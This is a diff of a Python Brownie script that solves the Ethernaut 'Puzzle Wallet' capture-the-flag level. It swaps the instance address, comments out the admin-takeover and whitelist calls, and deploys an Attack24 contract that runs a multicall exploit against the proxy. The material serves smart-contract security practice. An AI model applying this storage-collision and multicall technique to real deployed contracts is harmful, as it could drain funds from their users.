@@ -3,7 +3,7 @@ from scripts.helpful_scripts import get_account
 from brownie import web3, network, interface, convert, Attack24, PuzzleWallet, PuzzleProxy, Contract
 from eth_utils import keccak
 
-ETHERNAUT_INSTANCE = "0xbfBbecD4aE33d097f5F7Edf2a6156F66322540AF"
+ETHERNAUT_INSTANCE = "0x1A0D1299ECb6538D3700C78c0e163AcBFBC535EC"
 GAS_LIMIT = 6000000
 
 def initialise(_player, _target):
@@ -62,14 +62,14 @@ def main():
     print_storage(player, target)
     
     # player becomes the owner
-    print(f"\nTaking ownership of PuzzleProxy\n")
-    target.proposeNewAdmin(player, {"from": player})   
-    print_storage(player, target)
+    # print(f"\nTaking ownership of PuzzleProxy\n")
+    # target.proposeNewAdmin(player, {"from": player})   
+    # print_storage(player, target)
      
     # add player to the whitelist  
-    print(f"\nAdding player address to the whitelist\n")
-    target.addToWhitelist(player, {"from": player})
-    print_storage(player, target)
+    # print(f"\nAdding player address to the whitelist\n")
+    # target.addToWhitelist(player, {"from": player})
+    # print_storage(player, target)
         
     # --> Now perform the multicall attack in Solidity
     
@@ -77,6 +77,8 @@ def main():
     attack = Attack24.deploy(ETHERNAUT_INSTANCE, {"from": player})
     attack.attack({"from": player})
     
+    print_storage(player, target)
+
 
 """
     Notes:
